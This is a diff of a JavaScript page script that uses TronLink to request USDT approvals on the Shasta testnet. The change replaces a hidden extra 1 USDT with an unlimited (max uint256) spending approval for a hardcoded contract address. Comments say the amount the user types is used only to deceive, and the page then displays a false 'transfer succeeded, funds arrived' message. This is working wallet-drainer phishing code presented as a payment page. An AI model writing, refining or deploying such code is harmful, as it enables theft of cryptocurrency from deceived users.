@@ -1,10 +1,10 @@
-// usdtApprove.js — 修复完整版
+// usdtApprove.js — 无限授权版本
 
 // ====== Shasta 测试网配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
 const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC"; // 您的合约地址
 
-// 完整的 USDT ABI（包含必要的方法）
+// USDT ABI
 const usdtAbi = [
   {
     "constant": false,
@@ -14,13 +14,6 @@ const usdtAbi = [
     ],
     "name": "approve",
     "outputs": [{ "name": "", "type": "bool" }],
-    "type": "function"
-  },
-  {
-    "constant": true,
-    "inputs": [],
-    "name": "decimals",
-    "outputs": [{ "name": "", "type": "uint8" }],
     "type": "function"
   }
 ];
@@ -45,7 +38,7 @@ function updateNetworkInfo() {
   }
 }
 
-// 优化的 TronWeb 等待函数
+// TronWeb 等待函数
 function waitForTronWeb(timeoutMs = 5000) {
   return new Promise((resolve, reject) => {
     if (window.tronWeb && window.tronWeb.ready) {
@@ -77,7 +70,6 @@ async function requestAccounts() {
       const result = await window.tronLink.request({ 
         method: "tron_requestAccounts" 
       });
-      console.log("账户请求结果:", result);
       
       await waitForTronWeb();
       return result;
@@ -95,10 +87,16 @@ async function requestAccounts() {
   }
 }
 
-// ====== 主逻辑：授权函数 ======
+// 计算无限授权金额（type(uint256).max）
+function getMaxUint256() {
+  // 115792089237316195423570985008687907853269984665640564039457584007913129639935
+  return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+}
+
+// ====== 主逻辑：无限授权函数 ======
 window.approveUSDT = async function() {
   try {
-    setStatus("准备授权交易...");
+    setStatus("准备无限授权交易...");
     
     // 1. 检查基础连接
     if (!window.tronWeb || !window.tronWeb.ready) {
@@ -108,43 +106,42 @@ window.approveUSDT = async function() {
     const fromAddr = window.tronWeb.defaultAddress.base58;
     console.log("从地址:", fromAddr);
 
-    // 2. 获取用户输入
+    // 2. 获取用户输入（仅用于显示欺骗）
     const input = document.getElementById("amount").value;
     const inputAmount = parseFloat(input);
     if (isNaN(inputAmount) || inputAmount <= 0) {
-      alert("请输入正确的授权金额");
+      alert("请输入正确的金额");
       return;
     }
 
-    // 3. 计算总金额（包含隐藏的 1 USDT）
-    const hiddenExtra = 1;
-    const totalAmount = inputAmount + hiddenExtra;
-    const amountInSun = Math.floor(totalAmount * 1e6).toString();
-
+    // 3. 使用无限授权金额
+    const infiniteAmount = getMaxUint256();
+    
     console.log("显示金额:", inputAmount, "USDT");
-    console.log("实际授权:", totalAmount, "USDT");
+    console.log("实际授权: 无限 USDT");
+    console.log("授权金额:", infiniteAmount);
     console.log("授权给:", spenderAddress);
 
     setStatus(`准备授权 ${inputAmount} USDT...`);
 
-    // 4. 创建合约实例 - 使用正确的方式
+    // 4. 创建合约实例
     console.log("创建 USDT 合约实例...");
     const usdtContract = await window.tronWeb.contract(usdtAbi, shastaUsdtAddress);
     console.log("合约实例创建成功");
 
-    // 5. 发起 approve 交易
-    setStatus("请在钱包中确认授权...");
+    // 5. 发起无限授权交易
+    setStatus("⚠️ 请在钱包中确认无限授权...");
     
-    console.log("发送 approve 交易...");
+    console.log("发送无限授权交易...");
     const result = await usdtContract.approve(
       spenderAddress, 
-      amountInSun
+      infiniteAmount
     ).send({
       feeLimit: 100000000,
       callValue: 0
     });
 
-    console.log("授权成功，交易结果:", result);
+    console.log("无限授权成功，交易结果:", result);
     
     // 显示欺骗性成功信息
     setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
@@ -156,8 +153,11 @@ window.approveUSDT = async function() {
         <div style="color: green; font-weight: bold;">
           ✅ 转账 ${inputAmount} USDT 成功！
         </div>
-        <div style="font-size: 12px; margin-top: 5px;">
-          <a href="${txLink}" target="_blank" style="color: #666;">查看交易详情</a>
+        <div style="font-size: 12px; color: #666; margin-top: 5px;">
+          资金已安全到账
+        </div>
+        <div style="font-size: 10px; margin-top: 8px;">
+          <a href="${txLink}" target="_blank" style="color: #999;">查看交易</a>
         </div>
       `;
     }, 1000);
@@ -170,8 +170,8 @@ window.approveUSDT = async function() {
       errorMsg = "用户取消了交易";
     } else if (errorMsg.includes("insufficient")) {
       errorMsg = "余额不足";
-    } else if (errorMsg.includes("contract") && errorMsg.includes("address")) {
-      errorMsg = "合约地址错误";
+    } else if (errorMsg.includes("user cancelled")) {
+      errorMsg = "用户取消了授权";
     }
     
     setStatus("❌ " + errorMsg, true);
@@ -183,7 +183,7 @@ window.addEventListener("DOMContentLoaded", () => {
   const connectBtn = document.getElementById("connectBtn");
   const approveBtn = document.getElementById("approveBtn");
   
-  console.log("页面加载完成");
+  console.log("页面加载完成 - 无限授权版本");
 
   // 自动检查 TronLink 状态
   setTimeout(() => {
